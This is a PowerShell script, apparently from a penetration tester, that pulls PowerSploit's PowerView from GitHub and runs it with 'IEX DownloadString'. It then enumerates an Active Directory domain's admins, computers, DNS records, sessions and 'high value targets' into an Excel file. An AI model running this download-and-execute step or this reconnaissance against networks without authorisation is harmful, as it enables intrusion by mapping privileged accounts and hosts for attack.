function Invoke-PowEnum
{
<# 
.SYNOPSIS 
    Quickly enumerate domain info using PowerSploit's PowerView and combine into XLSX
.DESCRIPTION 
    I've been teaching myself PowerShell scripting and this came about.
	Credit goes to contributers of PowerView for making a great tool.
.NOTES 
	Requires Excel to be installed on the systems running this script.
	TODO:
		Mode parameter (1-OnlyDCEnum 2-OnlyEnum 3-UserHunting 4-Kerberoast 5-LargeEnv)
		Sheets (1-User/GroupEnumeration 2-Computer/SessionEnumeration 3-Kerberoast/AS-REPoast)
			Add speciality user enum to user xls (http://www.netvision.com/ad_useraccountcontrol.php)
			Create sperate xls for for invokes (Invoke-Kerb, Find-DomainLocalGroupMem, Find-DomainUserLocation -Stealth)
	
.LINK 
	PowerSploit PowerView
	https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
	
	Export to CSV
	https://gist.github.com/gregklee/b01348787af0b47d8b30
.EXAMPLE 
    Invoke-PowEnum -Domain test.com
#>

[CmdletBinding(DefaultParameterSetName="Domain")]
Param(
	[Parameter(Position = 0)]
	[String]
	$Domain,
	
	[Parameter(Position = 1)]
	[ValidateSet('DCOnly', 'Hunting', 'Kerberoast', 'LargeEnv')]
    [String]
    $Mode = 'DCOnly'
)
	
	
Write-Host "To run from a non-domain joined system:" -ForegroundColor Cyan
Write-Host "runas /netonly /user:DOMAIN\USERNAME powershell.exe"

#Start Stopwatch
$stopwatch = [system.diagnostics.stopwatch]::startnew()

#Download PowerView From GitHub
$webclient = New-Object System.Net.WebClient
$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"
Write-Host "Downloading Powerview:" -ForegroundColor Cyan
Write-Host "$url"
IEX $webclient.DownloadString($url)

#Grab Local Domain Using PowerView Function If None Provided
if (!$domain) {$domain = (Get-Domain).Name}
Write-Host "Enumeration Domain: $domain" -ForegroundColor Cyan

$ErrorActionPreference = 'Continue'
$CSVSheetCount = 1

if ($Mode -eq 'DCOnly') {
	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
	PowEnum-DCs
	PowEnum-DAs
	PowEnum-EAs
	PowEnum-BltAdmins
	PowEnum-Users
	PowEnum-Groups
	PowEnum-Computers
	PowEnum-IPs
	PowEnum-DCLocalAdmins
	PowEnum-Subnets
	PowEnum-DNSRecords
	PowEnum-HVTs
	PowEnum-NetSess
}
elseif ($Mode -eq 'Hunting') {

}
elseif ($Mode -eq 'Kerberoast') {
}
elseif ($Mode -eq 'LargeEnv') {
}
else {
	Write-Host "Incorrect Mode Selected"
	Return
}



PowEnum-ExcelFile -SpreadsheetName AllLocalEnumeration

$stopwatch.Stop()
Write-Host "Running Time: $($stopwatch.Elapsed.TotalSeconds) seconds"
Write-Host "Exiting..." -ForegroundColor Yellow
}


function PowEnum-DCs {
	Write-Host "[ ]Domain Controllers | " -NoNewLine
	$temp = Get-DomainController -Domain $domain 
	PowEnum-ExportAndCount -TypeEnum DCs
}

function PowEnum-DAs {
	Write-Host "[ ]Domain Admins | " -NoNewLine
	$temp = Get-DomainGroupMember -Identity "Domain Admins" -Domain $domain
	PowEnum-ExportAndCount -TypeEnum DAs
}

function PowEnum-EAs {
	Write-Host "[ ]Enterprise Admins | " -NoNewLine
	$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Domain $domain
	PowEnum-ExportAndCount -TypeEnum EAs
}

function PowEnum-BltAdmins {
	Write-Host "[ ]Builtin Administrators | " -NoNewLine
	$temp = Get-DomainGroupMember -Identity "Administrators" -Domain $domain
	PowEnum-ExportAndCount -TypeEnum BltAdmins
}

function PowEnum-Users {
	Write-Host "[ ]All Domain Users | " -NoNewLine
	$temp = Get-DomainUser -Domain $domain
	PowEnum-ExportAndCount -TypeEnum Users
}

function PowEnum-Groups {
	Write-Host "[ ]All Domain Groups | " -NoNewLine
	$temp = Get-DomainGroup -Domain $domain
	PowEnum-ExportAndCount -TypeEnum Groups
}

function PowEnum-Computers {
	Write-Host "[ ]All Domain Computers | " -NoNewLine
	$temp = Get-NetComputer -Domain $domain
	PowEnum-ExportAndCount -TypeEnum Computers
}

function PowEnum-IPs {
	Write-Host "[ ]All Domain Computer IP Addresses  | " -NoNewLine
	$temp = Get-DomainComputer -Domain $domain | Get-IPAddress
	PowEnum-ExportAndCount -TypeEnum IPs
}

function PowEnum-DCLocalAdmins {
	Write-Host "[ ]All Domain Controller Local Admins | " -NoNewLine
	$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember
	PowEnum-ExportAndCount -TypeEnum DCLocalAdmins
}

function PowEnum-Subnets {
	Write-Host "[ ]Domain Subnets | " -NoNewLine
	$temp = Get-DomainSubnet -Domain $domain
	PowEnum-ExportAndCount -TypeEnum Subnets
}

function PowEnum-DNSRecords {
	Write-Host "[ ]DNS Zones & Records | " -NoNewLine
	$temp = Get-DomainDNSZone -Domain $domain | Get-DomainDNSRecord
	PowEnum-ExportAndCount -TypeEnum DNSRecords
}

function PowEnum-HVTs {
	Write-Host "[ ]High Value Targets | " -NoNewLine
	$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember | Select-Object -ExpandProperty MemberName | %{$_ -replace '^[^\\]*\\', ''} | Get-DomainGroupMember -Recurse
	PowEnum-ExportAndCount -TypeEnum HVTs
}

function PowEnum-NetSess {
	try {
	Write-Host "[ ]Net Sessions | " -NoNewLine
	$temp = Get-DomainController -Domain $domain | Get-NetSession -ErrorAction SilentlyContinue
	PowEnum-ExportAndCount -TypeEnum NetSess
	}
	catch {
	Write-Host "Error"
	}
}

function PowEnum-ExportAndCount {
	Param(
		[Parameter(Position = 0)]
		[String]
		$TypeEnum
	)
	if($temp -ne $null){$temp | Export-CSV -NoTypeInformation -Path ('.\' + $CSVSheetCount +'_' + $TypeEnum + '.csv')}
	$count = $temp | measure-object | select-object -expandproperty Count
	Write-Host "$count Identified" -ForegroundColor Green
	$CSVSheetCount++
}

function PowEnum-ExcelFile
{
	Param(
		[Parameter(Position = 0, Mandatory = $True)]
		[String]
		$SpreadsheetName
	)
	
	Write-Host "[ ]Combining CSV Files to XSLX | " -NoNewLine
	$path = (Get-Item -Path ".\" -Verbose).FullName
	$XLOutput =  $path + "\" + $env:USERNAME + "_$SpreadsheetName" + "_" + $(get-random) + ".xlsx"

	$csvFiles = Get-ChildItem (".\*") -Include *.csv | Sort-Object | Where {$_.Length -ne 0}

	# Create Excel object (visible), workbook and worksheet
	$Excel = New-Object -ComObject excel.application 
	$Excel.visible = $false
	$Excel.sheetsInNewWorkbook = $csvFiles.Count
	$workbooks = $excel.Workbooks.Add()
	$CSVSheet = 1

	Foreach ($CSV in $Csvfiles) {

		$worksheets = $workbooks.worksheets
		$CSVFullPath = $CSV.FullName
		
		$SheetName = ($CSV.name -split "\.")[0]
		$worksheet = $worksheets.Item($CSVSheet)
		$worksheet.Name = $SheetName
		
		# Define the connection string and the starting cell for the data
		$TxtConnector = ("TEXT;" + $CSVFullPath)
		$CellRef = $worksheet.Range("A1")

		# Build, use and remove the text file connector
		$Connector = $worksheet.QueryTables.add($TxtConnector,$CellRef)
		$worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True 
		$worksheet.QueryTables.item($Connector.name).TextFileParseType  = 1 
		$worksheet.QueryTables.item($Connector.name).Refresh() | Out-Null
		$worksheet.QueryTables.item($Connector.name).delete()

		# Autofit the columns, freeze the top row
		$worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null
		$worksheet.Application.ActiveWindow.SplitRow = 1
		$worksheet.Application.ActiveWindow.FreezePanes = $true

		# Set color & border to top header row
		$Selection = $worksheet.cells.Item(1,1).EntireRow
		$Selection.Interior.ColorIndex = 37
		$Selection.BorderAround(1) | Out-Null
		$Selection.Font.Bold=$True
		
		$CSVSheet++
	}

	# Save workbook and close Excel
	$workbooks.SaveAs($XLOutput,51)
	$workbooks.Saved = $true
	$workbooks.Close()
	[System.Runtime.Interopservices.Marshal]::ReleaseComObject($workbooks) | Out-Null
	$Excel.Quit()
	[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel) | Out-Null
	Write-Host " $CSVSheet Sheeet(s) Processed" -ForegroundColor Green
	[System.GC]::Collect()
	[System.GC]::WaitForPendingFinalizers()
}